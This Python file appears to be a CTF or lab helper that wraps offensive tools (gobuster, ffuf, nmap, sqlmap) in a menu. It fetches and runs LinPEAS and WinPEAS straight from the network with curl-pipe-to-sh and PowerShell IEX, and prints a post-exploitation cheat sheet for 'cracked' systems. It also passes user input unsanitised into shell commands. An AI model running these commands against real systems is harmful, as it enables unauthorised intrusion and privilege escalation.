import os
import subprocess
import platform

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = process.communicate()
    print(out.decode())
    if err:
        print(err.decode())

def show_menu():
    print(r"""                                                                                                                                                                                                         
                                                                           
                            ██  █       █ ███                              
                         █████████     █████████                           
                        ███████ █████████ ███████                          
                        ███████ █████████ ███████                          
                       ██████ █ █████████ █  █████                         
                       ███  ███ █  ███  █ ████ ███                         
                       █ ████ ██ █ █████ ██  █ █  █                        
                      ██ ████ █ ██ ██████ █ ██ █ ██                        
                 ████    ████ █ ██ █  ███ █ ██ █     ████                  
             ████████         █ ██ █ ████ █               ██               
           █████████                                        ██             
           ████████████                                      ██            
            ███████████████                   ██  ██   █   ███             
              ██████████████████████████████ ████  ██   ███                
                   ███████████████████████████████ ████                    
                           ████████████████████                            
                          █                                                
                          ████████████                                     
                          ████████████                                     
                           ███████████                                     
                             ████                                          
                              ████████                                     
                                ██████                                     
          ___                                                               
        |  __ \                                       ( )    
        | |  | | ___   ___  _ __ _ __ ___   __ _ _ __ |/ ___ 
        | |  | |/ _ \ / _ \| '__| '_ ` _ \ / _` | '_ \  / __|
        | |__| | (_) | (_) | |  | | | | | | (_| | | | | \__ \
        |_____/ \___/ \___/|_|  |_| |_| |_|\__,_|_| |_| |___/
                                                                                                        
         ____                     __   _______   _      _        
        |  _ \                   / _| |__   __| (_)    | |       
        | |_) | _____  __   ___ | |_     | |_ __ _  ___| | _____ 
        |  _ < / _ \ \/ /  / _ \|  _|    | | '__| |/ __| |/ / __|
        | |_) | (_) >  <  | (_) | |      | | |  | | (__|   <\__ \
        |____/ \___/_/\_\  \___/|_|      |_|_|  |_|\___|_|\_\___/
                                                                 
         

    1. Gobuster Directory Enumeration
    2. Subdomain Fuzzing (FFUF)
    3. Nmap Port Scan
    4. Linpeas (Run on cracked Linux system)
    5. Winpeas (Run on cracked Windows system)
    6. SQLMap
    7. Software Version Scan (Run on Windows / Linux)
    8. Cheat Sheet
    9. Exit
    """)

def gobuster():
    url = input("Enter the URL to enumerate: ")
    wordlist = input("Enter the path to the wordlist: ")
    command = f"gobuster dir -u {url} -w {wordlist} -o gobuster_results.txt"
    run_command(command)
    wait_for_keypress()
    
def ffuf():
    url = input ("Enter the url, must be http: ")
    command = f"ffuf -w /usr/share/wordlists/dirb/big.txt -H 'Host:FUZZ.{url}' -u 'http://{url}'"
    run_command(command)
    wait_for_keypress()
    
def nmap():
    target = input("Enter the target IP or hostname: ")
    command = f"nmap -p- -T4 --min-rate=1000 {target} -A -oN nmap_results.txt"
    run_command(command)
    wait_for_keypress()

def linpeas():
    command = "curl -Ls https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
    run_command(command)
    wait_for_keypress()

def winpeas():
    command = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat')\""
    run_command(command)
    wait_for_keypress()

def SQLMap():
    url = input("Target url: ")
    command = f"sqlmap -u {url} --batch --tables --dbs"
    run_command(command)
    wait_for_keypress()

def wait_for_keypress():
    input("\nPress any key to return to the menu...")
    

def version_scan_linux():
    print("Performing software version scan on Linux...")
    commands = [
        "uname -a",
        "lsb_release -a",
        "cat /etc/os-release",
        "dpkg -l",
        "rpm -qa",
        "docker --version",
        "python3 --version",
        "java -version",
        "gcc --version",
        "apache2 -v",
        "nginx -v",
        "mysql --version",
        "postgres --version"
    ]
    for command in commands:
        print(f"\nRunning: {command}")
        run_command(command)
    wait_for_keypress()

def version_scan_windows():
    print("Performing software version scan on Windows...")
    commands = [
        "systeminfo",
        "wmic os get Caption, Version, BuildNumber, OSArchitecture",
        "wmic product get name, version",
        "powershell -Command \"Get-Command java, python, docker, gcc, mysql, postgres | Select-Object Name, Version\""
    ]
    for command in commands:
        print(f"\nRunning: {command}")
        run_command(command)
    wait_for_keypress()

def version_scan():
    system = platform.system()
    if system == "Linux":
        version_scan_linux()
    elif system == "Windows":
        version_scan_windows()
    else:
        print(f"Unsupported operating system: {system}")

def Basic_Cheat_Sheet():
    Cheat_sheet = print(r"""
    Upgrade shell to tty: 
    python3 -c 'import pty; pty.spawn('/bin/bash')'
    subv
    Writeable permission? *Linux: 
    echo $PATH
    
    SUID Libraries *Linux: 
    find / -perm -4000 2>/dev/null
    """)
    wait_for_keypress()

def main():
    while True:
        show_menu()
        choice = input("Select an option: ")

        if choice == '1':
            gobuster()
        elif choice == '2':
            ffuf()
        elif choice == '3':
            nmap()
        elif choice == '4':
            linpeas()
        elif choice == '5':
            winpeas()
        elif choice == '6':
            SQLMap()
        elif choice == "7":
            version_scan()
        elif choice == "8":
            Basic_Cheat_Sheet()
        elif choice == '9':
            print("Exiting...")
            break
        else:
            print("Invalid option, please try again.")

if __name__ == "__main__":
    main()
